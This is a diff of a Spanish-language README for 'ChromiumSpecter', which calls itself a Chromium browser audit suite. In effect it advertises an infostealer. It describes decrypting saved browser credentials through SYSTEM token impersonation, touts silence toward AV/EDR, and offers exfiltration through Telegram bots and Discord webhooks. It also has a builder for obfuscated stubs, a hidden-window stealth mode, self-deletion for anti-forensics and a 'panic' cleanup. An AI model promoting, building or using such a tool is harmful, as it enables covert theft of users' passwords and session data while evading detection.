@@ -1,4 +1,4 @@
-# 🛡️ ChromiumSpecter Auditor Suite `v2.5.0` (V20 Stable)
+# 🛡️ ChromiumSpecter Auditor Suite `v2.6.0` (V20 Stable)
 
 > [!NOTE]
 > [English Version](README.en.md) | **Versión en Español**
@@ -11,7 +11,7 @@
 ![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
 ![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
 
-*La suite definitiva de grado táctico para auditorías de seguridad en navegadores Chromium.*
+*La suite definitiva de grado táctico para auditorías de seguridad en navegadores Chromium (Chrome, Edge, Brave, Vivaldi, Opera, Opera GX).*
 
 [Reportar Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)
 
@@ -32,7 +32,7 @@ ChromiumSpecter implementa un motor de descifrado directo mediante impersonació
 | Característica | Impersonación CNG + SYSTEM (ChromiumSpecter) | Enfoque COM + Inyección (C++ - Chrome-App-Bound-Encryption-Decryption) |
 | :--- | :--- | :--- |
 | **Requisito de Privilegios** | Requiere privilegios de Administrador (para impersonar `winlogon` y habilitar `SeDebugPrivilege`). | **VENTAJA:** No requiere privilegios elevados (corre bajo el usuario estándar). |
-| **Firma de Evasión (AV / EDR)** | **VENTAJA:** Extremadamente silencioso. No inyecta código, no crea procesos suspendidos, no altera la memoria de otros procesos. Utiliza únicamente APIs legítimas de Windows (`ncrypt.dll`). | **CRÍTICO:** Ruidoso. La inyección DLL, el Process Hollowing y el uso de Direct Syscalls son altamente monitoreados y bloqueados por EDRs modernos. |
+| **Firma de Evasión (AV / EDR)** | **VENTAJA:** Extremely silent. No inyecta código, no crea procesos suspendidos, no altera la memoria de otros procesos. Utiliza únicamente APIs legítimas de Windows (`ncrypt.dll`). | **CRÍTICO:** Ruidoso. La inyección DLL, el Process Hollowing y el uso de Direct Syscalls son altamente monitoreados y bloqueados por EDRs modernos. |
 | **Resistencia a Actualizaciones** | **VENTAJA:** Altamente resistente. Mientras el navegador registre la clave en el KSP de Windows con el mismo nombre, el descifrado funciona independientemente de cambios en la interfaz COM. | **DESVENTAJA:** Frágil. Cambios en las interfaces internas de los navegadores (como la transición a `IElevator2` en Chrome 144) inutilizan las stubs de C++ y exigen reescritura. |
 | **Complejidad del Código** | **VENTAJA:** Baja complejidad. Lógica pura de interacción con la API de Windows mediante `ctypes` de Python. | **DESVENTAJA:** Altísima complejidad. Requiere cargadores PE en memoria, manejo de offsets de VTable y stubs de interfaces COM para cada navegador. |
 
@@ -43,9 +43,10 @@ ChromiumSpecter implementa un motor de descifrado directo mediante impersonació
 ### 🌟 Características Destacadas
 
 * **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados.
-* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.5.0`**:
-  * Soporte total para **Chrome v127+ (App-Bound Encryption)** mediante el nuevo módulo `v20_decryptor`.
-  * Descifrado híbrido: Soporta **AES-GCM (v10/v11)**, **DPAPI Legacy** y el nuevo esquema **v20** en la misma base de datos.
+* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.6.0`**:
+  * Soporte nativo total para **Chrome v127+, Edge v127+ y Brave v130+ (App-Bound Encryption)** mediante el módulo `v20_decryptor`.
+  * Descifrado híbrido: Soporta **AES-GCM (v10/v11)**, **DPAPI Legacy** y el nuevo esquema **v20** de forma simultánea en la misma base de datos.
+  * **Soporte Brave Direct Key**: Mapeo automático de payloads de 32 bytes directos sin flags complejos.
   * **Sincronización Inteligente**: El motor ahora utiliza importaciones dinámicas para sobrevivir a ofuscadores y garantizar portabilidad.
   * **Escalada de Privilegios**: Implementa impersonación nativa de SYSTEM (vía `winlogon.exe`) para extraer llaves protegidas por el sistema. **(Requiere ejecutar como Administrador)**.
   * Detección inteligente: El motor identifica el prefijo (`v10`, `v11`, `v20`) y aplica el algoritmo correspondiente con fallback automático.
@@ -55,7 +56,7 @@ ChromiumSpecter implementa un motor de descifrado directo mediante impersonació
   * **Anti-Forensics**: Soporte para **Autodestrucción Táctica** (Auto-Delete) del binario tras la ejecución.
   * **Protocolo de Pánico**: Saneamiento total del entorno de auditoría con un solo clic.
 * **🧠 Detección Inteligente de Perfiles**:
-  * Escaneo diferenciado: Chrome/Edge/Brave usan subdirectorios (`Default`, `Profile N`); Opera/Vivaldi usan la raíz directamente.
+  * Escaneo diferenciado y visualización premium integrada (badges de colores de marca para Chrome, Edge, Brave, Vivaldi, Opera y Opera GX).
   * Validación de tamaño de archivo antes de procesar (evita falsos positivos con BD vacías).
   * Manejo de `PermissionError` por perfil sin abortar el escaneo completo.
 
@@ -69,7 +70,7 @@ ChromiumSpecter implementa un motor de descifrado directo mediante impersonació
 * **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
 * **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.
 
-### 🛠️ Builder Visual Integrado `v2.5.0`
+### 🛠️ Builder Visual Integrado `v2.6.0`
 
 Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
 **Universal Dependency Injection**: El builder ahora parsea automáticamente `requirements.txt` y resuelve dependencias en tiempo de compilación.
@@ -94,7 +95,7 @@ Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
 El motor principal (`main.py`) puede ejecutarse de forma independiente sin la interfaz gráfica, ideal para automatizaciones o despliegues rápidos via terminal.
 
 > [!IMPORTANT]
-> **REQUERIMIENTO DE PRIVILEGIOS**: Para descifrar perfiles de **Chrome v127+ (V20)**, es **OBLIGATORIO** ejecutar la terminal (o el `.exe`) con **privilegios de Administrador**. Sin estos privilegios, el motor no podrá realizar la impersonación de SYSTEM necesaria para acceder al almacén de llaves CNG.
+> **REQUERIMIENTO DE PRIVILEGIOS**: Para descifrar perfiles de **Chrome, Edge y Brave v127+ (V20)**, es **OBLIGATORIO** ejecutar la terminal (o el `.exe`) con **privilegios de Administrador**. Sin estos privilegios, el motor no podrá realizar la impersonación de SYSTEM necesaria para acceder al almacén de llaves CNG.
 
 ```bash
 # Auditoría básica
@@ -152,7 +153,6 @@ Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu bin
 > - **Mostrar Consola** (Compilador): Determina si el **Sistema Operativo** crea la ventana desde cero. Desmarcado = `Windowed App`, nunca hay ventana negra.
 > - **Modo Stealth** (Runtime): La ventana sí se crea, pero el código la oculta en milisegundos con `ShowWindow(0)`. Puede verse un destello breve.
 > - **Recomendación**: Dejá "Mostrar Consola" **desmarcado** + "Modo Stealth" **marcado** para doble capa de sigilo.
-```
 
 ---
 
@@ -161,11 +161,11 @@ Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu bin
 | Componente | Tecnología |
 | :--- | :--- |
 | **Core UI** | `CustomTkinter` (Modern Dark Theme) |
-| **Criptografía** | `v20 (App-Bound)`, `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` |
-| **Seguridad OS** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`) |
+| **Criptografía** | `v20 (App-Bound)`, `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` + `SYSTEM Token Impersonation` |
+| **Seguridad OS** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`, `DuplicateTokenEx`, `ImpersonateLoggedOnUser`) |
 | **Compilación** | `PyInstaller` + `PyArmor` + `UPX` |
 | **Persistencia** | `JSON` Local (`.audit/exfil_config.json`) |
-| **Testing** | `pytest` + `pytest-mock` (20 tests, 0 fallos) |
+| **Testing** | `pytest` + `pytest-mock` (22 tests, 0 fallos) |
 
 ---
 
